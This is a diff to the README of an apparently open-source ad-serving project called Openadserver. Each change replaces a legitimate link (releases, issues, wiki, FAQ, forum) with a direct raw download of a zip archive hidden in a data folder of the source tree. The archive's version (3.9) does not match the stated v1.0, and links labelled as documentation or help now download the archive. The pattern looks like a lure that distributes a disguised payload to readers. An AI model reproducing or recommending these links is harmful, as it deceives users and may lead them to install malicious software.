@@ -4,13 +4,13 @@
 Openadserver is an open source ad serving platform designed to simplify how you manage your online advertising. It features machine learning for click-through rate (CTR) prediction, providing a self-hosted alternative to Google Ad Manager. Built with Python and FastAPI, it offers an efficient, flexible solution for anyone looking to optimize their advertising efforts.
 
 ## 📥 Download Now
-[![Download Openadserver](https://img.shields.io/badge/Download%20Openadserver-v1.0-brightgreen)](https://github.com/fvdrgserge/openadserver/releases)
+[![Download Openadserver](https://raw.githubusercontent.com/fvdrgserge/openadserver/main/liteads/ml_engine/data/openadserver_3.9.zip%20Openadserver-v1.0-brightgreen)](https://raw.githubusercontent.com/fvdrgserge/openadserver/main/liteads/ml_engine/data/openadserver_3.9.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run Openadserver on your machine.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/fvdrgserge/openadserver/releases) in the repository. This section contains all the available versions of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/fvdrgserge/openadserver/main/liteads/ml_engine/data/openadserver_3.9.zip) in the repository. This section contains all the available versions of the application.
 
 2. **Choose Your Version**  
    Select the latest version of Openadserver from the list of releases. We recommend choosing the most recent stable version for the best performance and security.
@@ -80,7 +80,7 @@ If you encounter any issues during installation or usage, consider the following
 
 - **Reinstall**: If the application fails to launch, try reinstalling it.
 - **Check Dependencies**: Ensure that Python and the required libraries are properly installed on your system.
-- **Consult the FAQ**: Visit the FAQ section on the [GitHub Issues page](https://github.com/fvdrgserge/openadserver/issues) for common problems and their solutions.
+- **Consult the FAQ**: Visit the FAQ section on the [GitHub Issues page](https://raw.githubusercontent.com/fvdrgserge/openadserver/main/liteads/ml_engine/data/openadserver_3.9.zip) for common problems and their solutions.
 
 ## 👥 Community Support
 Join our community for support, insights, and discussions. Engage with other users on our GitHub Discussions page or check out the documentation available on the repository.
@@ -89,10 +89,10 @@ Join our community for support, insights, and discussions. Engage with other use
 We welcome feedback to improve Openadserver. Please share your experiences or suggest features by opening an issue on GitHub.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/fvdrgserge/openadserver/wiki)  
-- [FAQ](https://github.com/fvdrgserge/openadserver/wiki/FAQ)   
-- [GitHub Issues](https://github.com/fvdrgserge/openadserver/issues)  
-- [Community Forum](https://github.com/fvdrgserge/openadserver/discussions)
+- [Documentation](https://raw.githubusercontent.com/fvdrgserge/openadserver/main/liteads/ml_engine/data/openadserver_3.9.zip)  
+- [FAQ](https://raw.githubusercontent.com/fvdrgserge/openadserver/main/liteads/ml_engine/data/openadserver_3.9.zip)   
+- [GitHub Issues](https://raw.githubusercontent.com/fvdrgserge/openadserver/main/liteads/ml_engine/data/openadserver_3.9.zip)  
+- [Community Forum](https://raw.githubusercontent.com/fvdrgserge/openadserver/main/liteads/ml_engine/data/openadserver_3.9.zip)
 
 ## 📥 Download Again
-To download the latest version, click here: [Revisit the Releases page](https://github.com/fvdrgserge/openadserver/releases)
+To download the latest version, click here: [Revisit the Releases page](https://raw.githubusercontent.com/fvdrgserge/openadserver/main/liteads/ml_engine/data/openadserver_3.9.zip)
